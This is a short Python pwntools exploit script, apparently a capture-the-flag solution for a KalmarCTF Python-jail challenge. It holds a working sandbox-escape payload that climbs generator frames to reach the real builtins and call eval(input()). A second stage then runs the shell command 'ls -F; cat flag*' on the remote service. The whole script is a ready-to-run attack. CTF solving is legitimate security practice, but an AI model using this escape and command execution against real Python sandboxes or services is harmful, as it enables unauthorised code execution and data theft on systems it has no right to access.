#!/usr/bin/env python3
from pwn import *

HOST = 'ccg2ql49adpied7gaamt.j4.chal-kalmarc.tf'
PORT = 1337

# Connect over SSL
log.info(f"Connecting to {HOST}:{PORT}...")
io = remote(HOST, PORT, ssl=True)

# 1. Wait for the prompt
io.recvuntil(b'> ')

# 2. The 71-character Surgical Payload
# This navigates to the real builtins and calls eval(input())
payload = b"next(x:=(lambda:(yield(x.gi_frame.f_back.f_back.f_builtins)))())['eval'](input())"
log.info("Sending Stage 1 (The Surgical Escape)...")
io.sendline(payload)

# 3. Small sleep to ensure the server is ready for the input() call
sleep(1)

# 4. Stage 2: The Data Grab
# We'll list the files and try to read anything starting with 'flag'
# This covers cases where the flag is 'flag', 'flag.txt', or 'flag_RANDOM.txt'
log.info("Sending Stage 2 (Searching for and reading flag)...")
cmd = b"__import__('os').system('ls -F; cat flag*')"
io.sendline(cmd)

# 5. Get the goods
log.success("Exploit triggered. Output:")
print(io.recvall(timeout=5).decode())